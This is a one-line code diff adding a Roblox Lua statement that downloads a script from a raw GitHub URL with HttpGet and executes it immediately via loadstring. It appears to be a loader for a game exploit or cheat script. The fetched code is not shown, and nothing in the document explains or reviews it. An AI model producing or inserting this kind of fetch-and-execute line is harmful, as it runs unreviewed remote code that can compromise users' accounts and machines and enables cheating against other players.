@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/OhhMyGehlee/sdwa56/main/jilo"))()
